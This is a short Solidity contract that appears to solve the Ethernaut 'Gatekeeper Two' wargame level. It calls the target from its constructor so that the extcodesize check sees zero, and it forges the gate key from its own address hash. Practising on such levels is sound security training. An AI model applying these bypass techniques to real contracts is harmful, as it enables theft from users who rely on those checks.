// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

// import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/math/SafeMath.sol';

contract Ethernaut {
//   using SafeMath for uint256;

    constructor(address _instance) public {
        // constructor 中 call , extcodesize = 0
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  (uint64(0) - 1);
        (bool success, bytes memory result) = address(_instance).call(abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
        require(success);

    }

}
